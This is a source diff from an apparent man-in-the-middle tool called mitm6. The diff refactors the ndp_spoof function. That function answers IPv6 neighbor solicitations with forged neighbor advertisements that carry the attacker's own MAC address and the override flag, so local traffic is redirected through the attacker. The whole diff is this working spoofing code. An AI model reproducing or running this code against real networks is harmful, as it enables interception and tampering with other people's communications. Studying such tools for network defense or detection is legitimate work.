@@ -16,73 +16,63 @@
  * You should have received a copy of the GNU General Public License
  * along with mitm6.  If not, see <http://www.gnu.org/licenses/>.
  */
-#include <net/ethernet.h>
-#include <netinet/ip6.h>
-#include <netinet/icmp6.h>
 #include <arpa/inet.h>
+#include <string.h>
 
 #include "mitm6.h"
 #include "packet.h"
+#include "protocols.h"
 
 extern char *iface;
 
 void ndp_spoof(const u_char *bytes, size_t len)
 {
-        struct ether_header *ether = NULL;
-        struct ip6_hdr *ip = NULL;
-        struct icmp6_hdr *icmp = NULL;
-        struct nd_neighbor_solicit *ns = NULL;
-        struct nd_neighbor_advert na;
-        char sspoof[INET6_ADDRSTRLEN];
+        struct ether *ether = NULL;
+        struct ip6 *ip = NULL;
+        struct icmp6 *icmp = NULL;
+        struct icmp6_nd_ns *ns = NULL;
+        char s1[INET6_ADDRSTRLEN], s2[INET6_ADDRSTRLEN];
         struct packet *p = NULL;
-        int cksum = 0;
         u_char *mac = NULL;
 
-        ether = (struct ether_header *)bytes;
-        ip = (struct ip6_hdr *)(bytes + sizeof(struct ether_header));
+        ether = (struct ether *)bytes;
+        ip = (struct ip6 *)(bytes + sizeof(struct ether));
 
-        if (ip->ip6_nxt == IPPROTO_ICMPV6) {
-                icmp = (struct icmp6_hdr *)(bytes + sizeof(struct ether_header) + sizeof(struct ip6_hdr));
+        if (ip->nxt == IP6_NXT_ICMP6) {
+                icmp = (struct icmp6 *)(bytes + sizeof(struct ether) + sizeof(struct ip6));
         } else {
                 /* TODO */
-                warning("SKIP IP6 EXTENSION HEADERS!!! -- skipping packet");
+                fatal("no ICMPv6 packet!!! Skipping...");
                 return;
         }
         
-        if (icmp->icmp6_type == ND_NEIGHBOR_SOLICIT) {
-                ns = (struct nd_neighbor_solicit *)icmp;
-
-                bzero(sspoof, INET6_ADDRSTRLEN);
-                inet_ntop(AF_INET6, &(ns->nd_ns_target), sspoof, 
-                          INET6_ADDRSTRLEN);
-                printf("Spoofing %s\n", sspoof);
-
-                /* Prepare NA message */
-                na.nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;
-                na.nd_na_hdr.icmp6_code = 0;
-                na.nd_na_hdr.icmp6_cksum = 0;
-                na.nd_na_hdr.icmp6_data32[0] &= 0xC0000000;
-                /* na.nd_na_hdr.icmp6_data32[0] &= 0x40000000; */
-                na.nd_na_target = ns->nd_ns_target;
-
-                cksum = calculate_checksum((u_char *)&(ns->nd_ns_target), (u_char *)&(ip->ip6_src), 
-                                           IPPROTO_ICMPV6, (u_char *)&na, sizeof(struct nd_neighbor_advert));
-
-                na.nd_na_hdr.icmp6_cksum = cksum;
+        if (icmp->type == ICMP6_T_ND_NS) {
 
                 mac = get_mac(iface);
                 if (mac == NULL)
                         return;
+                
+                if (memcmp(mac, ether->src, ETH_ADDR_LEN) == 0) {
+                        free(mac);
+                        return;
+                }
 
-                /* TODO: insert my mac address!!! */
+                ns = (struct icmp6_nd_ns *)(bytes + sizeof(struct ether) + sizeof(struct ip6) + sizeof(struct icmp6));
+
+                bzero(s1, INET6_ADDRSTRLEN);
+                inet_ntop(AF_INET6, ns->target, s1, INET6_ADDRSTRLEN);
+                bzero(s2, INET6_ADDRSTRLEN);
+                inet_ntop(AF_INET6, ip->src, s2, INET6_ADDRSTRLEN);
+
+                printf("Spoofing %s with target %s\n", s2, s1);
+
                 p = packet_init();
-                packet_add_ether(p, mac, ether->ether_shost, ETH_P_IPV6);
-                packet_add_ip6(p, sizeof(struct nd_neighbor_advert), IPPROTO_ICMPV6, 255, &(ns->nd_ns_target), &(ip->ip6_src), (u_char *)&na);
-
-                inject_packet(p->data, p->len);
-
+                packet_add_ether(p, mac, ether->src, ETH_TYPE_IP6);
+                packet_add_ip6(p, sizeof(struct icmp6) + sizeof(struct icmp6_nd_na), IP6_NXT_ICMP6, IP6_HLIM, ns->target, ip->src);
+                packet_add_icmp6_nd_na(p, ICMP6_ND_NA_F_SOLICIT | ICMP6_ND_NA_F_OVERRIDE, ns->target);
+                packet_send(iface, p);
                 packet_free(p);
+
                 free(mac);
-                mac = NULL;
         }
 }
